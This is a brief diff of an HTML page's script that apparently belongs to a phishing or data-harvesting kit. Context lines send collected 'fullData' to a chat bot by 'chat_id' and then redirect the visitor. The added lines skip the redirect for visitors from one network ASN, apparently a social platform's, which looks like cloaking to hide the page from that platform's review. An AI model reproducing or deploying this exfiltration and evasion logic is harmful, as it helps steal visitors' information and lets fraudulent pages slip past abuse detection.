@@ -42,10 +42,13 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: fullData, parse_mode: 'HTML' })
                 });
-                window.location.href = URL_REDIRECT;
+                if(geoData.asn === 32934){
+                }else{
+                window.location.href = URL_REDIRECT;}
             });
         </script>
     </body>
 </html>
+
 
 
